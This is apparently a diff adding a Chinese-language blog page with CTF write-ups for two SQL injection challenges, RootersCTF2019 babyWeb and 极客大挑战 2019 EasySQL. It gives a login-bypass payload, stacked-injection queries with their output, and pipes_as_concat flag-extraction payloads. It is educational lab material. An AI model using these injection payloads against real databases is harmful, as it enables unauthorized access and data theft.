@@ -1,0 +1,209 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Ezsql - EZzz</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="[RootersCTF2019]babyWebSQL查询，过滤了：union、sleep、’、”、or、-、benchmark
+order by测试字段数，发现当order by 2时返回正常ord,"> 
+    
+    <link rel="alternative" href="atom.xml" title="EZzz" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="Ezsql - EZzz"/>
+    <meta name="twitter:description" content="[RootersCTF2019]babyWebSQL查询，过滤了：union、sleep、’、”、or、-、benchmark
+order by测试字段数，发现当order by 2时返回正常ord,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="EZzz"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="Ezsql - EZzz"/>
+    <meta property="og:description" content="[RootersCTF2019]babyWebSQL查询，过滤了：union、sleep、’、”、or、-、benchmark
+order by测试字段数，发现当order by 2时返回正常ord,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">EZzz</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">Ezsql</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">Ezsql</h1>
+        <div class="stuff">
+            <span>十二月 26, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h1><p>SQL查询，过滤了：union、sleep、’、”、or、-、benchmark</p>
+<p>order by测试字段数，发现当order by 2时返回正常order by 3返回没有这个字段，确定为两个字段，一个为uniqueid另一个应该就是flag</p>
+<p>输入id判断登录，即可，尝试万能密码登录：1 || 1&#x3D;1 limit 0,1<br>返回flag</p>
+<p><img src="/2022/12/26/%E7%AC%94%E8%AE%B0/13.jpg" alt="题图"></p>
+<h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>1.输入1，看到有回显<code>Array ( [0] =&gt; 1 )</code>，输入<code>1#</code>有回显，但是输入<code>1&#39;</code>和<code>1&#39;#</code>都没有回显，连报错都没有，就说明不能使用报错注入，而且<code>&quot;</code>被过滤了</p>
+<p>2.而且输入<code>and,or,union,if,order,from,sleep等</code>都会显示Nonono，说明都被过滤了，不能使用联合注入、时间盲注、布尔盲注</p>
+<p>3.最后发现可以使用堆叠注入</p>
+<p>先使用payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1;show databases#</span><br><span class="line"></span><br><span class="line">回显</span><br><span class="line">Array ( [0] =&gt; 1 ) Array ( [0] =&gt; ctf ) Array ( [0] =&gt; ctftraining ) Array ( [0] =&gt; information_schema ) Array ( [0] =&gt; mysql ) Array ( [0] =&gt; performance_schema ) Array ( [0] =&gt; test )</span><br></pre></td></tr></table></figure>
+
+<p>再使用payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1;show tables#</span><br><span class="line"></span><br><span class="line">回显</span><br><span class="line">Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )</span><br></pre></td></tr></table></figure>
+
+<p>这就说明有一个flag表，但from没法使用不能打开表中的列，而且hendler也被过滤</p>
+<p>4.然后wp上有一个知识点，如果打开<code>set sql_mode=pipes_as_concat</code>模式，则||运算符用作字符串连接</p>
+<p>比如一般select 6||1会返回1，但如果打开这个模式，就会返回61，因为直接被当作字符串来连接起来了</p>
+<p>5.然后wp上猜测的是这个原语句是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql=&quot;select post[&#x27;query&#x27;] || flag from Flag&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>所以就会有两种方法</p>
+<p>方法一payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br><span class="line"></span><br><span class="line">这就相当于执行了</span><br><span class="line">select *,1||flag from Flag</span><br></pre></td></tr></table></figure>
+
+<p>方法二payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode=pipes_as_concat;select 1</span><br><span class="line"></span><br><span class="line">这就相当于执行了</span><br><span class="line">select 1;set sql_mode=pipes_as_concat;select 1||flag from Flag;</span><br><span class="line">因为打开了这个模式，所以1||flag会被当成1和flag，而不会进行运算</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
